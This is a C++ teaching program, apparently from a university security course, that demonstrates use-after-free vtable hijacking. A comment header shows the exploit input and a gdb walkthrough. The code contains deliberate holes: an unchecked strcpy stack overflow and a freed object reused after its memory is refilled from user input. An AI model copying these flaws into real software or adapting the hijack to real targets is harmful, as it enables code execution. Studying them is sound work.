/*
 * Use-after-free (UAF) vulnerability demonstration. 
 * (c) Elias Athanasopoulos,  athanasopoulos.elias@ucy.ac.cy
 *
 * Compile the attached C program.
 * $ g++ -Wall -no-pie -fno-pic -m32 uaf.c -o uaf
 * 
 * Test the vtable hijacking attack:
 * $ ./uaf `printf "\xa8\xa0\x04\x08"`
 * 
 * How to explore the mechanics with gdb.
 * 
 * (gdb) b *0x08049277
 * Breakpoint 1 at 0x8049277: file uaf.cpp, line 65.
 * 
 * (gdb) r e5ce4db216329f4f
 * The program being debugged has been started already.
 * Start it from the beginning? (y or n) y
 * Starting program: /home/elathan/src/epl326-src/heap/uaf e5ce4db216329f4f
 * [Thread debugging using libthread_db enabled]
 * Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 * 0xbffffcdc
 * Validating password: e5ce4db216329f4f
 * 
 * Breakpoint 1, 0x08049277 in main (argc=2, argv=0xbffffdf4) at uaf.cpp:65
 * 65              w = new AdminWelcomeMessage();
 * (gdb) ni 4
 * 0x08049285      66              gW = w;
 * (gdb) info vtbl w
 * vtable for 'WelcomeMessage' @ 0x804a0a4 (subobject @ 0x8051bb0):
 * [0]: 0x804935c <WelcomeMessage::cleanup()>
 * [1]: 0x8049390 <AdminWelcomeMessage::print()>
 * 
 * (gdb) b *0x08049338
 * Breakpoint 2 at 0x8049338: file uaf.cpp, line 79.
 * (gdb) r `printf "\xa4\xa0\x04\x08"`
 * Starting program: /home/elathan/src/epl326-src/heap/uaf `printf "\xa4\xa0\x04\x08"`
 * [Thread debugging using libthread_db enabled]
 * Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 * 0xbffffcec
 * Validating password: ï¿½ï¿½
 * Welcome user.
 * Breakpoint 2, 0x08049338 in main (argc=2, argv=0xbffffe04) at uaf.cpp:79
 * 79          gW->cleanup();
 * (gdb) x $eax
 * 0x8051bb0:      0x0804a0a4
 * (gdb) x *$eax
 * 0x804a0a4 <_ZTV19AdminWelcomeMessage+8>:        0x0804935c
 * (gdb) r `printf "\xa8\xa0\x04\x08"`
 * The program being debugged has been started already.
 * Start it from the beginning? (y or n) y
 * Starting program: /home/elathan/src/epl326-src/heap/uaf `printf "\xa8\xa0\x04\x08"`
 * [Thread debugging using libthread_db enabled]
 * Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 * 0xbffffcec
 * Validating password: ï¿½ï¿½
 * Welcome user.
 * 
 * Breakpoint 2, 0x08049338 in main (argc=2, argv=0xbffffe04) at uaf.cpp:79
 * 79          gW->cleanup();
 * (gdb) x $eax
 * 0x8051bb0:      0x0804a0a8
 * (gdb) x *$eax
 * 0x804a0a8 <_ZTV19AdminWelcomeMessage+12>:       0x08049390
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

class WelcomeMessage {
public:
    virtual void cleanup() {
        printf("Cleaning up resources.\n");
    }
    virtual void print() {
        printf("Welcome to the system.\n");
    }
};

class AdminWelcomeMessage : public WelcomeMessage {
public:
    virtual void print() {
        printf("Welcome administrator.\n");
    }
};

class UserWelcomeMessage : public WelcomeMessage {
public:
    virtual void print() {
        printf("Welcome user.\n");
    }
};  

WelcomeMessage *gW;

int password_valid = 0;

void authenticate_root(char *passwd) {
	unsigned long marker = 0xdeadbeef;
	char password[16];

	strcpy(password, passwd);

	fprintf(stderr, "%p\n", &marker);
	fprintf(stderr, "Validating password: %s\n", password);

	if (!strcmp(password, "e5ce4db216329f4f")) 
		password_valid = marker;

}

int main(int argc, char *argv[]) {

    WelcomeMessage *w;
	
    authenticate_root(argv[1]);

	if (password_valid != 0) {
        w = new AdminWelcomeMessage();
        gW = w;
        w->print();
        delete w;
	} else {
        w = new UserWelcomeMessage(); 
        gW = w;
        w->print();
        delete w;
	}

    char *str = (char *)malloc(sizeof *gW);
    strncpy(str, argv[1], 4);

    gW->cleanup();

	return 1;
}